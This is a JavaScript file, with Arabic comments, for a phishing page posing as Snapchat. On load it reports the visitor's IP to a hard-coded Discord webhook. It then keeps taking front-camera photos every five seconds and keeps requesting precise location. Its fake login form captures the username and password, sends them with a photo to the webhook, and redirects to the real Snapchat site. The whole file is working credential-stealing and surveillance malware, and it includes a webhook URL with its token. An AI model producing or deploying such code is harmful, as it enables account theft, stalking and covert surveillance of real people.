'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP الجهاز فور الدخول
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "Unknown"; }
}

// 2. إرسال البيانات إلى ديسكورد
async function sendData(imgBlob, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `🛰️ **تحديث صيد جديد (كل 5 ثوانٍ)**\n🌐 IP: \`${ip}\` \n`;
    
    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
    
    if (userLat && userLng) {
        content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
    }

    if (imgBlob) formData.append('file', imgBlob, 'camera.png');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter PRO",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. طلب الموقع بشكل إجباري متكرر
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
        },
        (err) => {
            // إعادة الطلب كل ثانية في حال الرفض
            setTimeout(forceLocation, 1000);
        },
        { enableHighAccuracy: true }
    );
}

// 4. تشغيل النظام الكامل
async function initTracker() {
    // إشعار دخول فوري
    const ip = await getIP();
    fetch(WEBHOOK_URL, { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({content: `🚀 صيد دخل الموقع! IP: ${ip}`}) 
    });

    try {
        // طلب الكاميرا (السيلفي)
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        });
        
        video.srcObject = stream;

        // طلب الموقع فوراً بعد الكاميرا
        forceLocation();

        // حلقة التقاط الصور كل 5 ثوانٍ
        setInterval(() => {
            // التأكد من أن الكاميرا تبث بيانات (لتجنب الصور السوداء)
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(blob => {
                    if (blob && blob.size > 1000) { // التأكد من أن الصورة ليست فارغة
                        sendData(blob);
                    }
                }, 'image/png');
            }
        }, 5000);

    } catch (err) {
        // إذا رفض الكاميرا، استمر في طلب الموقع وإرسال IP
        forceLocation();
        setInterval(() => sendData(null), 5000);
    }
}

// معالجة فورم الدخول (apply2.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(async (blob) => {
            await sendData(blob, u, p);
            setTimeout(() => {
                window.location.href = "https://accounts.snapchat.com/";
            }, 1500);
        }, 'image/png');
    });
}

window.onload = initTracker;
